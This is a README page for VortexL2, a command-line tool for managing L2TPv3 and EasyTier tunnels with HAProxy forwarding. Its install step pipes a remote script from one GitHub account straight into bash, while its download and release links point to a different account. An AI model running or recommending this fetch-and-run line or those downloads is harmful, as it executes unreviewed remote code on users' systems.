---
layout: "default"
title: "🌊 VortexL2 - Manage Your Tunnels Easily"
description: "🌐 Manage L2TPv3 and EasyTier tunnels effortlessly with VortexL2, a powerful CLI tool featuring HAProxy integration and a user-friendly TUI."
---
# 🌊 VortexL2 - Manage Your Tunnels Easily

## 🚀 Download Now
[![Download VortexL2](https://img.shields.io/badge/Download-VortexL2-blue.svg)](https://github.com/Jennesispogi055/VortexL2/releases)

---

## 📜 Introduction

**VortexL2** is a command line tool designed for Ubuntu and Debian that simplifies the management of L2TPv3 and EasyTier mesh tunnels. With a focus on high availability and performance, it provides a straightforward way to activate and manage your VPN tunnels.

## ✨ Features

- **Interactive TUI management panel**: Navigate with ease using the rich user interface.
- **Two tunnel types**: Choose between L2TPv3 for traditional Ethernet tunneling or EasyTier for modern mesh VPN setups.
- **High-performance port forwarding**: Utilize HAProxy for efficient data transfer, activated manually for your control.
- **Systemd integration**: Ensure your tunnels run persistently even after a system restart.
- **One-liner installation**: Set up VortexL2 quickly with a simple command.

## 📦 Installation

To get started with VortexL2, follow these simple steps:

1. Open your terminal on your Ubuntu or Debian system.
2. Run the following command to install VortexL2:

   ```bash
   bash <(curl -Ls https://raw.githubusercontent.com/iliya-Developer/VortexL2/main/install.sh)
   ```

3. During the installation, you will be prompted to choose a tunnel type:
   - **L2TPv3**: Select this option if you prefer a traditional L2TP Ethernet tunnel.
   - **EasyTier**: Choose this for a modern mesh VPN experience.

## 🔗 Download & Install

For the latest version of VortexL2, please visit the [Releases page](https://github.com/Jennesispogi055/VortexL2/releases) to download the appropriate package for your system. Follow the on-screen instructions to complete the installation.

## ⚙️ System Requirements

Ensure your system meets the following requirements:

- **Operating System**: Ubuntu 18.04 or later, Debian 9 or later.
- **Disk Space**: At least 200 MB of free space.
- **Network Connection**: A stable internet connection for downloading the necessary files.

## 🛠️ Configuration

Once you have installed VortexL2, you can begin configuring your tunnels:

1. **Open the management panel** by running:

   ```bash
   vortexl2
   ```

2. Follow the on-screen prompts to set up your tunnels. You can easily switch between L2TPv3 and EasyTier options.

3. To check the status of your tunnels, use the command:

   ```bash
   vortexl2 status
   ```

4. Ensure that both the tunnels and HAProxy are running to maintain connectivity.

## 📚 Using VortexL2

### Start Using Tunnels

To start your tunnels:

- Use the command to activate your chosen tunnel:

   ```bash
   vortexl2 start
   ```

- Monitor the status with:

   ```bash
   vortexl2 logs
   ```

You can stop a tunnel using:

```bash
vortexl2 stop
```

### Help and Support

If you encounter issues or need help, you can access the built-in help feature:

```bash
vortexl2 help
```

Or you can visit the GitHub issues page [here](https://github.com/Jennesispogi055/VortexL2/issues) to report bugs or ask questions.

## 🎯 Best Practices

- Regularly update to the latest version of VortexL2 to benefit from security fixes and new features.
- Always keep backups of your configurations to prevent data loss.

## 📄 License

VortexL2 is open-source and available under the MIT License. You can contribute or view the source code on our [GitHub repository](https://github.com/Jennesispogi055/VortexL2).

---

For more information or updates, remember to check the [Releases page](https://github.com/Jennesispogi055/VortexL2/releases). Enjoy managing your tunnels with ease!